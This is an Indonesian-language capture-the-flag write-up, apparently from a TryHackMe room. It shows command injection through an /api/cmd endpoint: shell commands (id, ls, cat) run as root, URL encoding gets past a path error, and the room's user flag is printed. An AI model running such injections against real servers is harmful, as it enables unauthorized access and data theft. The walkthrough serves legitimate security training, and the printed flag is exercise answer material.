pergi ke `http://IP-target:3000`. dari hint yang ada, McSkidy menemukan endpoint menarik yaitu `/api/cmd`

namun ketika kita pergi ke `http://IP-target:3000/api/cmd` yang didapat hanyalah text `"Cannot GET /api/cmd/"`. Karena tema dari room kali ini adalah command injection, kita dapat melakukan beberapa modifikasi pada url

- `../cmd?paramter=id`
- `../cmd?execute=id`
- `../cmd/parameter=id`
- `../cmd/execute=id`
- `../cmd/id`

Dari cara 1&2 tidak ada perubahan yang berarti, namun pada cara 3&4 terdapat "stdout" dan "stderr" yang mana mengindikasikan output dan error. Selaint itu, karena kita memasukkan `../cmd/id` maka akan menghasilkan output
```html
stdout	"uid=0(root) gid=0(root) groups=0(root)\n"
```
yang megnindikasikan bahwa command injection yang dilakukan telah berhasil. Selanjutnya kita dapat menggunakan command yang lain.

- `../cmd/ls`
```html
stdout	"bin\nboot\ndata\ndev\netc\nhome\nlib\nlib64\nlocal\nmedia\nmnt\nopt\nproc\nroot\nrun\nsbin\nsrv\nsys\ntmp\nusr\nvar\n"
```

- `../cmd/ls home`
```html
stdout	"bestadmin\nec2-user\n"
```

- `../cmd/ls home/bestadmin`
```
Cannot GET /api/cmd/ls%20/home/bestadmin
```

ternyata terdapat error pada saat kita memasukkan slash lain, kita dapat coba mengatasinya dengan url encoding

- `../cmd/ls%20home%2Fbestadmin`
```html
stdout	"bin\nnew-room\nrun.sh\nuser.txt\n"
```

- `../cmd/cat%20home%2Fbestadmin%2Fuser.txt`
```html
stdout 5W7WkjxBWwhe3RNsWJ3Q\n
```